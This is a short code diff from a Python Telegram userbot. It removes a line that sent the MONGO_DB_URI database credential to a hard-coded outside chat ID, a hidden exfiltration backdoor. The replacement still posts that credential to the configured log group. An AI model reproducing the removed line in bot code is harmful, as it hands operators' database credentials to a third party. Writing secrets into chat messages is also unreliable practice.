@@ -159,7 +159,7 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message("-1002146005311", MONGO_DB_URI)
+                await self.one.send_message(config.LOGGER_ID, MONGO_DB_URI)
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
